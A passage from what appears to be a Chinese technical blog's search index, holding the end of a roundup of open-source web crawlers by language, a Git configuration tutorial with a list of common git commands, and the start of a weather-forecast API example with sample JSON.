https://www.cs.cmu.edu/~rcm/websphinx/#about ※18. Spiderman 实现语言： Java GitHub Star 数： 2400 官方支持链接 简介： Spiderman 是一种 Java 开源 Web 数据抽取工具。它采集特定的 Web 页面，并从中抽取有用数据。 Spiderman 主要使用 XPath 和正则表达式等技术抽取实际数据。 特性： 更高的性能。 持久化集合状态。 分布式。 支持 JavaScript。 – 官方文档： https://gitee.com/l-weiwei/spiderman – 官方网站： https://gitee.com/l-weiwei/spiderman ※19. WebCollector : 实现语言： Java GitHub Star 数： 1986 官方支持链接 简介： WebCollector 是一种基于 Java 的开源 Web 爬虫框架。 它为实现 Web 爬取功能提供了一下基本的接口。用户可以使用它在五分钟内建立起一个多线程爬虫。 特性： 快速。 – 官方文档： https://github.com/CrawlScript/WebCollector – 官方网站： https://github.com/CrawlScript/WebCollector ※20. Webmagic 实现语言： Java GitHub Star 数： 6891 官方支持链接 简介： WebMagic 是一种可扩展的爬虫框架。 WebMagic 涵盖了爬虫的整个生命周期，包括下载、URL 管理、内容抽取和持久化。 可用于简化一些特定爬虫的开发。 特性： 高度灵活的简单内核。 提供实现 HTML 抽取的简单 API。 使用 POJO 标注定制爬虫，无需配置。 支持多线程和分布式。 易于集成。 – 官方文档： http://webmagic.io/docs/en/ – 官方网站： https://github.com/code4craft/webmagic ※21. StormCrawler 实现语言： Java GitHub Star 数：437 官方支持链接 简介： StormCrawler 是一种基于 Apache Storm 构架分布式 Web 爬虫的开源 SDK。 StormCrawler 为开发人员构建爬虫提供了软件库和一系列资源。 StormCrawler 完全适用于以数据流提供需获取和解析的 URL 的情况，也非常适用于大规模递归性爬取，尤其是需要低延迟的情况。 特性： 可扩展。 有弹性。 低延迟。 易于扩展。 运行良好且高效。 – 官方文档： http://stormcrawler.net/docs/api/ – 官方网站： http://stormcrawler.net/ ※JavaScript 编写的开源 Web 爬虫 ※22. NodeCrawler 实现语言： JavaScript GitHub Star 数： 3999 官方支持链接 简介： NodeCrawler 是一种广为使用的 Web 爬虫，它基于 NodeJS 实现，具有非常快的爬取速度。 Nodecrawler 非常适用于偏爱使用 JavaScript 编程或者致力于 JavaScript 项目的开发人员。其安装也非常简单。 JSDOM 和 Cheerio（用于 HTML 解析）实现服务器端渲染。其中，JSDOM 更为稳定。 特性： 使用 Cheerio（默认）或 JSDOM 实现服务端 DOM 和自动 jQuery 插入。 可配置池子规模和重试次数。 控制爬取率限制。 请求的优先队列。 支持 forceUTF8 模式，使得爬虫可以检测并转换字符集。 与 4.x 乃至更新版本兼容。 – 官方文档：https://github.com/bda-research/node-crawler – 官方网站：http://nodecrawler.org/ ※23. Simplecrawler 实现语言： JavaScript GitHub Star 数：1764 官方支持链接 简介： Simplecrawler 设计提供基本的、灵活且稳定的网站爬取 API。 Simplecrawler 在实现上考虑了针对特大型 Web 站点的归档、分析和搜索。它可爬取上百万页面，并毫无问题地向磁盘写入数十 GB 数据。 特性： 提供了用于自动检测链接资源的一些简单逻辑，用户可自行替换和添加。 自动请求任何 robots.txt 禁止规则。 具有灵活的队列系统，可在磁盘上冻结和解冻。 – 官方文档： https://github.com/simplecrawler/simplecrawler – 官方网站： https://www.npmjs.com/package/simplecrawler ※24. Js-crawler : 实现语言： JavaScript GitHub Star 数： 167 官方支持链接) 简介： 使用 NodeJS 实现的 Web 爬虫，支持 HTTP 和 HTTPS – 官方文档： https://github.com/antivanov/js-crawler – 官方网站： https://github.com/antivanov/js-crawler ※25. Webster 实现语言： JavaScript GitHub Star 数： 201 官方支持链接 简介： Webster 是一种使用 NodeJS 编写的可靠 Web 爬取和采集框架，用于爬取 Web 站点并从页面中抽取结构化数据。 与其他爬取框架的不同之处在于，Webster 可以抓取浏览器客户端的 JavaScript 和 Ajax 请求呈现的内容。 – 官方文档： http://webster.zhuyingda.com/ – 官方网站： https://github.com/zhuyingda/webster ※26. Node-osmosis 实现语言：JavaScript GitHub Star 数： 3630 **官方支持链接 简介： * 一种使用 NodeJS 实现的 HTML/XML 解析器和 Web 爬虫。 特性： 使用原生 libxml 的 C 绑定。 干净的 Promise 类接口。 支持 CSS 3.0 和 XPath 1.0 选择器的混合。 Sizzle 选择器、Slick 选择器以及更多。 不具有像 jQuery、cheerio 或 jsdom 那样的大型依赖。 构成深度和复杂的数据结构。 HTML 解析器特性： 快速解析； 高速搜索； 内存占用小。 HTML DOM 特性： 加载和搜索 ajax 内容； DOM 交互和事件； 执行嵌入和远程脚本； 在 DOM 中执行代码。 HTTP 请求特性： 日志记录 URL，重定向和错误； Cookie 的 jar 包，以及自定义 Cookie/头部/用户代理； 登录/表单提交、会话 Cookie，基本的认证； 单代理、多代理，处理代理失败情况； 限制重试和重定向。 – 官方文档： https://rchipka.github.io/node-osmosis/global.html – 官方网站： https://www.npmjs.com/package/osmosis ※27. Supercrawler 实现语言：JavaScript GitHub Star 数： 4341 官方支持链接 简介： Supercrawler 是一种使用 NodeJS 实现的 Web 爬虫，在设计上支持高度可配置和易用性。 一旦成功爬取一个网页（可以是图像、文本文档或其他任何文件），Supercrawler 将会触发用户自定义的内容类型（content-type）处理器，处理页面解析、保存数据以及其它一些用户定义的功能。 特性： 链接检测：Supercrawler 会解析所爬取的 HTML 文档，识别其中链接并添加到队列中。 机器人解析：在爬取前 Supercrawler 会请求 robots.txt 并检查其中的禁止规则。它也可识别站点地图。 站点地图解析：Supercrawler 可以从 XML 站点地图文件中读取链接，并将链接添加到队列中。 并发限制：Supercrawler 可限制在任一时间发出的请求数。 速率限制：Supercrawler 可添加请求的时延，以免对服务器产生轰炸。 指数补偿（Exponential backoff）重试：Supercrawler 将依此在一小时、两小时、四小时乃至更多时间后重试请求。要使用该特性，爬取队列必须使用数据库或 Redis 作为后端。 主机名均衡：Supercrawler 可在不同主机名间平均分割请求量。要使用该特性，爬取队列必须以 Redis 为后端。 – 官方文档： https://github.com/brendonboshell/supercrawler – 官方网站： https://github.com/brendonboshell/supercrawler ※28. Web scraper 的 Chrome 扩展 实现语言：JavaScript GitHub Star 数： 775 官方支持链接 简介： Web Scraper 是一种 Chrome 浏览器扩展，构建用于从 Web 页面抽取数据。 用户可以使用该扩展创建计划（站点地图），定义如何遍历一个 Web 网站，以及如何从中抽取数据。 Web Scraper 使用站点地图相应地遍历网站，并从中抽取数据。 支持以 CSV 格式导出所抽取的数据。 特性： 抽取多个页面。 站点地图和抽取的数据存储在浏览器的本地存储，也可存储在 CouchDB 中。 多种数据类型选取。 支持从动态网页（JavaScript+AJAX）抽取数据。 浏览抽取的数据。 以 CSV 格式导出抽取的数据。 导入、导出站点地图。 只依赖于 Chrome 浏览器。 – 官方文档： https://www.webscraper.io/documentation – 官方网站： https://www.webscraper.io ※29. Headless Chrome 爬虫 实现语言：JavaScript GitHub Star 数： 3256 官方支持链接 简介： 使用基本 HTML 文件请求的爬虫，通常速度很快。但这样的爬虫往往会抽取到空白内容，尤其是在爬取使用 AngularJS、React 和 Vue.js 等现代前端框架构建的网站时。 特性： 分布式爬取。 可配置并发、延迟和重试。 支持深度优先搜索和广度优先搜索算法。 支持插拔缓存存储，例如 Redis。 支持导出 CSV 和 JSON。 在达到最大请求时暂停爬取，并可在任一时刻恢复。 自动插入用于抽取的 jQuery。 保存屏幕截图，用于证实爬取过程。 模拟设备和用户代理。 具有优先队列，可提高爬取效率。 – 官方文档： https://github.com/yujiosaka/headless-chrome-crawler/blob/master/docs/API.md – 官方网站： https://github.com/yujiosaka/headless-chrome-crawler ※30. X-ray 实现语言：JavaScript GitHub Star 数： 4464 官方支持链接 特性： 模式灵活：支持字符串、数组、对象以及嵌套对象结构。模式并非绑定于所抽取的页面结构，支持用户获取选定结构中的数据。 可组合（Composable）：API 是完全可组合的，赋予用户抽取每个页面的极大灵活性。 分页支持：爬取页面在 Web 站点上的所有分页。X-ray 还支持请求延迟和分页限制，并支持将爬取页面导入到单个文件中。这样一旦单个页面产生错误，用户不会失去所有已爬取的数据。 爬虫支持：从一个页面开始，轻易跳转另一个页面。页面跳转是可预测的，按深度优先爬取所有页面。 负责任的爬取：X-ray 支持并发、限制、延迟、超时和限制，实现负责任地爬取任何页面。 可插拔驱动：可按用户需求置换不同的爬虫。 – 官方文档： https://github.com/matthewmueller/x-ray – 官方网站： https://www.npmjs.com/package/x-ray-scraper ※C 编写的开源 Web 爬虫 ※31. Httrack 实现语言：C GitHub Star 数： 747 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： HTTracks 是一项免费（GPL、Libre/自由软件）且易于使用的离线浏览器功能。 支持用户将 Web 站点下载到本地目录，递归构建全部目录，以及获取 HTML、图像和其它文件到本地计算机。 HTTrack 会维持原站点的相对链接结构。用户可以用浏览器打开本地的“镜像”页面，并逐个链接浏览，与在线浏览无异。 HTTrack 也支持对已有镜像站点的更新，以及从中断点恢复下载。 HTTrack 高度可配置，并提供帮助文档。 特性： 多语言窗口，提供对 Linux/UNIX 的接口。 镜像单个站点，或是一并镜像多个站点。 支持按文件类型、链接位置、结构深度、文件大小过滤，接受或拒绝站点或文件名。 支持代理，可最大化速度，并可选认证。 – 官方文档： http://www.httrack.com/html/index.html – 官方网站： http://www.httrack.com/ ※32. GNU Wget 实现语言：C GitHub Star 数： 22 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： GNU Wget 是一种免费软件包，它使用 HTTP、HTTPS、FTP、FTPS 等广为使用的互联网协议检索文件。 Wget 是一种非交互式命令行工具，易于从脚本、Cron 任务、不具有 X 窗口支持的终端等处调用。 特性： 使用 REST 和 RANGE 支持从中断处恢复下载。 基于 NLS 的消息文件，可使用多种语言。 可运行于大多数类 UNIX 操作系统上，也支持 Windows. 支持 HTTP 代理。 支持 HTTP Cookie。 – 官方文档： https://www.gnu.org/software/wget/manual/ – 官方网站： https://www.gnu.org/software/wget/ ※C++编写的开源 Web 爬虫 ※33. gigablast 实现语言：C++ GitHub Star 数： 912 **官方支持链接 简介： Gigablast 是一种开源的 Web 和企业搜索引擎，也是一种爬虫。 Gigablast 是自身维护数十亿页面检索索引的数家美国搜索引擎之一。 特性： 大规模。 高性能。 实时信息检索技术。 – 官方文档： http://www.gigablast.com/api.html – 官方网站： http://www.gigablast.com/ ※C#编写的开源 Web 爬虫 ※34. http://Arachnode.net 实现语言：C# GitHub Star 数： 9 官方支持链接 简介： http://Arachnode.net 适用于寻求开源 Web 爬虫的 C#开发人员。 http://Arachnode.net 软件类库从因特网下载内容、对内容做索引，并对过程做定制。 用户可使用该工具做个人内容聚合，也可用于将下载的内容抽取、采集和解析为多个表单。 http://Arachnode.net 索引所发现的内容，并存储在 http://Lucene.NET 索引中。 http://Arachnode.net 非常适用于文本挖掘，也适用于学习高级爬取技术。 特性： 可配置规则和行为。 集成 http://Lucene.NET。 支持 SQL Server 和全文本索引。 支持对.DOC/.PDF/.PPT/.XLS 等文件类型的索引。 支持将 HTML 转化为 XML 和 XHTML。 支持全部 JavaScript/AJAX 功能。 支持多线程和节流(Throttling)。 行为适当（Respectful）的爬取。 分析服务。 – 官方文档： https://documentation.arachnode.net/index.html – 官方网站： http://arachnode.net/ ※35. Abot 实现语言：C# GitHub Star 数： 1392 官方支持链接 简介： Abot 是一种 C#实现的开源 Web 爬虫，主要侧重于速度和灵活性。 Abot 在实现中考虑了底层技术细节，包括多线程、HTTP 请求、调度、链接解析等。 用户只需注册事件，就可以处理分页数据。 支持用户插入自己的核心接口实现，实现对整个爬取过程的完全控制。 特性： 高速！ 易于定制（可插拔架构，支持用户定义爬取内容和方式）。 经过大量的单元测试（高代码覆盖率）。 非常轻量级（并非过度工程化）。 无过程之外的依赖，例如对数据库、所安装服务等的依赖。 – 官方文档： https://github.com/sjdirect/abot – 官方网站： https://github.com/sjdirect/abot ※36. Hawk 实现语言：C# GitHub Star 数： 1875 官方支持链接 简介： HAWK 无需用户做任何编程，提供图形可视化数据获取和清理工具，并以 GPL 协议开源。 特性： 无需编程，即可实现对 Web 内容的智能分析。 所见即所得（WYSIWYG），可视化拉拽，支持对数据转换和过滤等的快速处理。 支持从多种数据库和文件中导入和导出。 任务可保存并可重用。 尤其适用于爬取和数据清理，但其功能并不仅局限于此。 – 官方文档： https://github.com/ferventdesert/Hawk – 官方网站： https://ferventdesert.github.io/Hawk/ ※37. SkyScraper 实现语言：C# GitHub Star 数： 39 官方支持链接 简介： 一种异步 Web 获取和爬虫，使用了 async/await 和响应式扩展。 – 官方文档： https://github.com/JonCanning/SkyScraper – 官方网站： https://github.com/JonCanning/SkyScraper ※.NET 编写的 Web 爬虫 ※38. DotnetSpider 实现语言：.NET GitHub Star 数： 1382 官方支持链接 简介： DotnetSpider 是一种使用.NET Standard 实现的 Web 爬取软件库，类似于 WebMagic 和 Scrapy。 它是一种适用于.NET 的轻量级、高效和高速的高层 Web 爬取和获取框架。 – 官方文档： https://github.com/dotnetcore/DotnetSpider/wiki – 官方网站： https://github.com/dotnetcore/DotnetSpider ※PHP 编写的开源 Web 爬虫 ※39. Goutte 实现语言：PHP GitHub Star 数： 6574 官方支持链接 简介： Goutte 是一种 PHP 实现的屏幕抓取和 Web 爬取软件库。 Goutte 为爬取 Web 站点和从 HTML/XML 响应中抽取数据提供了很好的 API。 – 官方文档： https://goutte.readthedocs.io/en/latest/ – 官方网站： https://github.com/FriendsOfPHP/Goutte ※40. Dom-crawler 实现语言：PHP GitHub Star 数： 1340 官方支持链接 简介： DomCrawler 组件简化了对 HTML 和 XML 文档的 DOM 浏览。 – 官方文档： https://symfony.com/doc/current/components/dom_crawler.html – 官方网站： https://github.com/symfony/dom-crawler ※41. Pspider 实现语言：PHP GitHub Star 数： 249 官方支持链接 简介： Pspider 是最近完全使用 PHP 实现的一种并行爬取框架，它基于 hightman/httpclient 组件。 – 官方文档： https://github.com/hightman/pspider – 官方网站： https://github.com/hightman/pspider ※42. Php-spider 实现语言：PHP GitHub Star 数： 1023 官方支持链接 简介： 一种可配置、可扩展的 Web 爬虫。 特性： 可限制爬取深度、队列大小和最大下载数。 支持基于 XPath、CSS 选择器或普通（Plain old）PHP 添加自定义的 URI 发现逻辑。 提供了一系列有用的 URI 过滤器，例如域限制等。 收集爬取统计信息，用于形成报告。 – 官方文档： https://github.com/mvdbos/php-spider – 官方网站： https://github.com/mvdbos/php-spider ※43. Spatie / Crawler 实现语言：PHP GitHub Star 数： 740 **官方支持链接 简介： 该软件包提供了从 Web 站点爬取链接的类。在实现的底层机制上，使用了 GuzzleHttp/Promise 并发爬取多个 URL。 该爬虫支持执行 JavaScript，可以爬取使用 JavaScript 渲染的站点。从实现的底层机制看，该特性使用了 Chrome 和 Puppeteer。 – 官方文档： https://github.com/spatie/crawler – 官方网站： https://github.com/spatie/crawler ※Ruby 实现的开源 Web 爬虫 ※44. Mechanize 实现语言：Ruby GitHub Star 数： 3728 官方支持链接 简介： Mechanize 软件库用于实现于 Web 站点的自动交互。 Mechanize 自动按重定向存储并发送 Cookie。可以根据链接提交表单，支持填写和提交表单域。 Mechanize 也可跟踪用户访问过站点的历史记录。 – 官方文档： http://docs.seattlerb.org/mechanize/ – 官方网站： https://github.com/sparklemotion/mechanize ※GO 编写的开源 Web 爬虫 ※45. Colly 实现语言：Go GitHub Star 数： 5439 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： 为 Go 爱好者提供了一种快速且适用的爬取框架。 Colly 提供了非常清晰的接口，可用于编写任何类型的爬虫和数据获取工具。 Colly 使得用户可以轻易地从站点抽取结构化数据。这些数据适用于大范围的应用，例如数据挖掘、数据处理和归档。 特性： 清晰的 API。 高速（支持单核每秒处理一千次以上的请求）。 按域管理请求延迟和最大并发。 自动 Cookie 和会话管理。 同步/异步/并行爬取。 支持缓存。 对非 unicode 响应的自动编码。 支持 robots.txt 禁止规则。 分布式爬取。 可通过环境变量配置。 支持扩展。 – 官方文档： http://go-colly.org/docs/ – 官方网站： http://go-colly.org/ ※46. Gopa 实现语言：Go GitHub Star 数： 169 官方支持链接 特性： 轻量级，低资源占用，小于 100MB 的内存需求。 易于部署，无需任何运行时和依赖关系。 易于使用，不需要用户具有任何编程和脚本技能，提供开箱即可用特性。 – 官方文档： https://github.com/infinitbyte/gopa – 官方网站： https://github.com/infinitbyte/gopa ※47. Pholcus 实现语言：Go GitHub Star 数： 4341 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： Pholcus 是一种完全使用 Go 语言实现的高并发性、重量级爬虫软件。 它针对因特网数据采集，为只具有基本 Go 或 JavaScript 编程基础的用户提供了一种只需要关注自定义功能的特性。 规则简单灵活，并发批处理任务，提供丰富的输出方式，包括 MySQL、MongoDB、Kafka、CSV、Exvel 等。 用户共享了大量的演示。此外，Pholcus 支持两种水平和垂直爬取模式，支持模拟登陆、暂停任务、取消任务等一系列高级特性。 特性： 一种强大的爬取工具。 支持三种运行模式：单机、服务器和客户。 提供三种操作接口：Web、GUI 和命令行。 – 官方文档： https://pholcus.gitbooks.io/docs/ – 官方网站： https://github.com/henrylee2cn/pholcus ※R 编写的开源 Web 爬虫 ※48. Rvest 实现语言：R GitHub Star 数： 969 官方支持链接 简介： Rvest 为用户从 Web 页面抽取信息提供帮助。它在设计上使用了 magrittr 软件包，易于表达通用 Web 抽取。 – 官方文档： https://cran.r-project.org/web/packages/rvest/rvest.pdf – 官方网站： https://github.com/hadley/rvest ※Scala 编写的开源 Web 爬虫 ※49. Sparkler 实现语言： Scala GitHub Star 数： 198 官方支持链接 简介： Web 爬虫是一种机器人程序，它从 Web 网站采集资源，用于构建搜索引擎、知识库等应用。 Sparkler（“Spark-Crawler”的缩写）是一种新型的 Web 爬虫，它通过整合 Spark、Kafka、Lucene/Solr、Tika、pf4j 等多种 Apache 项目，使用了分布式计算和信息检索领域的最新进展。 特性： 提供更高的性能，具有更好的容错。 支持复杂和近实时分析。 实时输出数据流。 可扩展的插件框架。 通用解析器。 – 官方文档： http://irds.usc.edu/sparkler/dev/development-environment-setup.html#contributing-source – 官方网站： http://irds.usc.edu/sparkler/ ※Perl 编写的开源 Web 爬虫 ※50. Web-scraper 实现语言：Perl GitHub Star 数： 91 官方支持链接 简介： Web Scraper 是一种使用 HTML、CSS 选择器或 XPath 表达式的 Web 采集工具集。 – 官方文档： https://github.com/miyagawa/web-scraper – 官方网站： https://github.com/miyagawa/web-scraper ※小结 以上罗列了 50 个不同编程语言下的不错爬虫框架/项目，感兴趣可以用用看。 英文原文： http://www.prowebscraper.com/blog/50-best-open-source-web-crawlers/ 本文转自 https://zhuanlan.zhihu.com/p/64305013，如有侵权，请联系删除。","tags":"爬虫"},{"title":"git专题","url":"/20220609/git-zhuan-ti/","text":"Git配置文件的常用参数解析 https://segmentfault.com/a/1190000019793936 我们有时候在多平台开发代码或者批量修改了文件夹的权限时，使用git status命令你很有可能会看到一大片的文件变更记录。其实不用担心，这些只是权限变更的文件也会被显示出来而已。如果你的工程目录不用考虑文件的权限，那么我们可以关闭这个特性： 1git config core.filemode false 今天我们介绍下git常用的一些配置参数。 ※git配置文件 当我们初始化或者clone一个git仓库的时候，会自动生成.git的目录，默认隐藏，但我们依然可以查看其文件，其中有一个config的文件是基础的配置文件： 12345678910111213141516$ cat .git/config[core] # 用于未来能够兼容git版本，决定怎么处理git命令和文件的 repositoryformatversion = 0 # 是否提供文件权限的diff filemode = true # 决定当前仓库是中心仓库还是开发库 bare = false # 记录所有的ref更新：决定变更ref时，会不会被记录在`$GIT_DIR/logs/&lt;ref&gt;`目录下 logallrefupdates = true[remote &quot;origin&quot;] fetch = +refs/heads/*:refs/remotes/origin/* url = ssh://zhaoshuaiqiang@git.com:8235/reposity[branch &quot;master&quot;] remote = origin merge = refs/heads/master ※repositoryformatversion 仓库版本 现在发布的版本号都是0，但这个属性是为了未来的兼容性，当开发者认为有新的特性需要加入的时候，可以将这个版本号改为1，此时，新的Git版本可以正确执行功能，而老的版本会出现报错： 1&quot;Expected git repo version &lt;= 0, found 1. Please upgrade Git&quot; ※filemode 文件权限 12# diff时考虑文件权限为true，不考虑为falsecore.filemode = true | false 我们通过这个参数来决定是否会diff文件的权限，如果是源代码，可以关闭这个选项，如果是脚本、二进制程序等需要权限认证之类的还是要开启该参数的： 1git config core.filemode false 更改完成后再cat下.git/config就会发现该参数变了。 ※bare 裸仓库 我们可以使用git init来将我们的目录转换为一个Git本地仓库或者初始化为一个新仓库。在初始化的时候我们可以加上--bare参数来决定是否创建一个裸仓库。 裸仓库一般指的是远端的中心仓库，可以被clone和push更新，但不包含工作区，因此不能执行常规的git命令，也不能进行直接的提交和变更。而普通仓库却正好相反，用于我们常规协作开发时的修改和提交。 12# 裸仓库为true，普通仓库为falsecore.bare = true | false ※logallrefupdates 记录引用更新 1core.logallupdates = true | false | always 当值为true时，会将所有引用(ref)的更新记录到$GIT_DIR/logs/&lt;ref&gt;中，包括更新的编号、日期和原因等内容。&lt;ref&gt;的值根据分支的不同为refs/heads/ 或 refs/remotes/等。 当值为always时，&lt;ref&gt;的值为refs/reflog。 当仓库为裸仓库时，值为false。 ※总结 我们可以通过文档来了解所有的参数，这里我们只需要了解bare和filemode两个即可，同时filemode可以通过命令来修改。 ※参考资料 https://stackoverflow.com/que… git tips: 设置filemode：https://www.jianshu.com/p/3b0… Git 本地仓库和裸仓库：https://segmentfault.com/a/11… Git文档：https://git-scm.com/docs/git-… git配置config文件 https://www.cnblogs.com/hellokitty2/p/10428001.html 1.Git有一个工具被称为git config，它允许你获取和设置变量；这些变量可以控制Git的外观和操作的各个方面。这些变量以等级的不同可以被存储在三个不同的位置： (1) /etc/gitconfig 文件：包含了适用于系统所有用户和所有库的值。如果你传递参数选项’–system’ 给 git config，它将明确的读和写这个文件。 (2) ~/.gitconfig 文件 ：具体到你的用户。你可以通过传递–global 选项使Git明确的读或写这个特定的文件。 (3) .git/config位于git目录的config文件，特定指向该单一的库。如果git config 时不加–system 也不加–global选项，那么只作用于当前的git版本库，配置产生的修改都体现在.git/config文件中 三个config文件是逐级覆盖的关系，具体的覆盖非具体的。 2.例子 (1) 用户标识配置 $ git config --global user.name “John Doe” //user.name就是对[user]下的name进行配置 $ git config --global user.email johndoe@example.com $ cat ~/.gitconfig [user] email = johndoe@example.com name = John Doe … 这里的修改是针对这个用户的所有git版本库的，若不加–global可以就是只针对某一个具体的版本库起作用，修改体现在.git/config下。 3.更多例子 $ git config --global core.editor emacs 指定你的编辑器 $ git config --global merge.tool vimdiff 指定你的比较工具(Your Diff Tool) $ git config --list 检查你的设置(Checking Your Settings) $ git help config 获取帮助(Getting help) 4.分别移除各个等级的一个配置项 git config --unset user.name git config --unset --global user.name git config --unset --system user.name 5.移除一组配置项 git config --remove-section color 6.git config get user.name 获取一个属性的值，当然也可以直接cat上面的config文件。 git 常用命令 !git 常用命令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586git init # 初始化本地git仓库（创建新仓库）git config --global user.name &quot;xxx&quot; # 配置用户名git config --global user.email &quot;xxx@xxx.com&quot; # 配置邮件git config --global color.ui true # git status等命令自动着色git config --global color.status autogit config --global color.diff autogit config --global color.branch autogit config --global color.interactive autogit config --global --unset http.proxy # remove proxy configuration on gitgit clone git+ssh://git@192.168.53.168/VT.git # clone远程仓库git status # 查看当前版本状态（是否修改）git add xyz # 添加xyz文件至indexgit add . # 增加当前子目录下所有更改过的文件至indexgit commit -m &#x27;xxx&#x27; # 提交git commit --amend -m &#x27;xxx&#x27; # 合并上一次提交（用于反复修改）git commit -am &#x27;xxx&#x27; # 将add和commit合为一步git rm xxx # 删除index中的文件git rm -r * # 递归删除git log # 显示提交日志git log -1 # 显示1行日志 -n为n行git log -5git log --stat # 显示提交日志及相关变动文件git log -p -mgit show dfb02e6e4f2f7b573337763e5c0013802e392818 # 显示某个提交的详细内容git show dfb02 # 可只用commitid的前几位git show HEAD # 显示HEAD提交日志git show HEAD^ # 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本git tag # 显示已存在的taggit tag -a v2.0 -m &#x27;xxx&#x27; # 增加v2.0的taggit show v2.0 # 显示v2.0的日志及详细内容git log v2.0 # 显示v2.0的日志git diff # 显示所有未添加至index的变更git diff --cached # 显示所有已添加index但还未commit的变更git diff HEAD^ # 比较与上一个版本的差异git diff HEAD -- ./lib # 比较与HEAD版本lib目录的差异git diff origin/master..master # 比较远程分支master上有本地分支master上没有的git diff origin/master..master --stat # 只显示差异的文件，不显示具体内容git remote add origin git+ssh://git@192.168.53.168/VT.git # 增加远程定义（用于push/pull/fetch）git branch # 显示本地分支git branch --contains 50089 # 显示包含提交50089的分支git branch -a # 显示所有分支git branch -r # 显示所有原创分支git branch --merged # 显示所有已合并到当前分支的分支git branch --no-merged # 显示所有未合并到当前分支的分支git branch -m master master_copy # 本地分支改名git checkout -b master_copy # 从当前分支创建新分支master_copy并检出git checkout -b master master_copy # 上面的完整版git checkout features/performance # 检出已存在的features/performance分支git checkout --track hotfixes/BJVEP933 # 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支git checkout v2.0 # 检出版本v2.0git checkout -b devel origin/develop # 从远程分支develop创建新本地分支devel并检出git checkout -- README # 检出head版本的README文件（可用于修改错误回退）git merge origin/master # 合并远程master分支至当前分支git cherry-pick ff44785404a8e # 合并提交ff44785404a8e的修改git push origin master # 将当前分支push到远程master分支git push origin :hotfixes/BJVEP933 # 删除远程仓库的hotfixes/BJVEP933分支git push --tags # 把所有tag推送到远程仓库git fetch # 获取所有远程分支（不更新本地分支，另需merge）git fetch --prune # 获取所有原创分支并清除服务器上已删掉的分支git pull origin master # 获取远程分支master并merge到当前分支git mv README README2 # 重命名文件README为README2git reset --hard HEAD # 将当前版本重置为HEAD（通常用于merge失败回退）git rebasegit branch -d hotfixes/BJVEP933 # 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支）git branch -D hotfixes/BJVEP933 # 强制删除分支hotfixes/BJVEP933git ls-files # 列出git index包含的文件git show-branch # 图示当前分支历史git show-branch --all # 图示所有分支历史git whatchanged # 显示提交历史对应的文件修改git revert dfb02e6e4f2f7b573337763e5c0013802e392818 # 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818git ls-tree HEAD # 内部命令：显示某个git对象git rev-parse v2.0 # 内部命令：显示某个ref对于的SHA1 HASHgit reflog # 显示所有提交，包括孤立节点git show HEAD@&#123;5&#125;git show master@&#123;yesterday&#125; # 显示master分支昨天的状态git log --pretty=format:&#x27;%h %s&#x27; --graph # 图示提交日志git show HEAD~3git show -s --pretty=raw 2be7fcb476git stash # 暂存当前修改，将所有至为HEAD状态git stash list # 查看所有暂存git stash show -p stash@&#123;0&#125; # 参考第一次暂存git stash apply stash@&#123;0&#125; # 应用第一次暂存git grep &quot;delete from&quot; # 文件中搜索文本“delete from”git grep -e &#x27;#define&#x27; --and -e SORT_DIRENTgit gcgit fsck","tags":"专题 git"},{"title":"天气预报接口","url":"/20220607/tian-qi-yu-bao-jie-kou/","text":"http://wthrcdn.etouch.cn/weather_mini?city=昆明 or http://wthrcdn.etouch.cn/weather_mini?citykey=101020100 1&#123;&quot;data&quot;:&#123;&quot;yesterday&quot;:&#123;&quot;date&quot;:&quot;6日星期一&quot;,&quot;high&quot;:&quot;高温 22℃&quot;,&quot;fx&quot;:&quot;东北风&quot;,&quot;low&quot;:&quot;低温 15℃&quot;,&quot;fl&quot;:&quot;&lt;![CDATA[2级]]&gt;&quot;,&quot;type&quot;:&quot;小雨&quot;&#125;,&quot;city&quot;:&quot;昆明&quot;,&quot;forecast&quot;:[&#123;&quot;date&quot;:&quot;7日星期二&quot;,&quot;high&quot;:&quot;高温 23℃&quot;,&quot;fengli&quot;:&quot;&lt;![CDATA[1级]]&gt;&quot;,&quot;low&quot;:&quot;低温 15℃&quot;,&quot;fengxiang&quot;:&quot;北风&quot;,&quot;type&quot;:&quot;小雨&quot;&#125;,&#123;&quot;date&quot;:&quot;8日星期三&quot;,&quot;high&quot;:&quot;高温 22℃&quot;,&quot;fengli&quot;:&quot;&lt;![CDATA[1级]]&gt;&quot;,&quot;low&quot;:&quot;低温 16℃&quot;,&quot;fengxiang&quot;:&quot;南风&quot;,&quot;type&quot;:&quot;阴&quot;&#125;,&#123;&quot;date&quot;:&quot;9日星期四&quot;,&quot;high&quot;:&quot;高温 21℃&quot;,&quot;fengli&quot;:&quot;&lt;![CDATA[1级]]&gt;&quot;,&quot;low&quot;:&quot;低温 16℃&quot;,&quot;fengxiang&quot;:&quot;西南风&quot;,&quot;type&quot;:&quot;小雨&quot;&#125;,&#123;&quot;date&quot;:&quot;10日星期五&quot;,&quot;high&quot;:&quot;高温 21℃&quot;,&quot;fengli&quot;:&quot;&lt;![CDATA[2级]]&gt;&quot;,&quot;low&quot;:&quot;低温 16℃&quot;,&quot;fengxiang&quot;:&quot;东北风&quot;,&quot;type&quot;:&quot;中雨&quot;&#125;,&#123;&quot;date&quot;:&quot;11日星期六&quot;,&quot;high&quot;:&quot;高温 21℃&quot;,&quot;fengli&quot;:&quot;&lt;![CDATA[1级]]&gt;&quot;,&quot;low&quot;:&quot;低温 16℃&quot;,&quot;fengxiang&quot;:&quot;东风&quot;,&quot;type&quot;:&quot;小雨&quot;&#125;],&quot;ganmao&quot;:&quot;感冒低发期，天气舒适，请注意多吃蔬菜水果，多喝水哦。&quot;,&quot;wendu&quot;:&quot;22&quot;&#125;,&quot;status&quot;:1000,&quot;desc&quot;:&quot;OK&quot;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&#123; &quot;data&quot;: &#123; &quot;yesterday&quot;: &#123; &quot;date&quot;: &quot;6日星期一&quot;, &quot;high&quot;: &quot;高温 22℃&quot;, &quot;fx&quot;: &quot;东北风&quot;, &quot;low&quot;: &quot;低温 15℃&quot;, &quot;fl&quot;: &quot;&lt;![CDATA[2级]]&gt;&quot;, 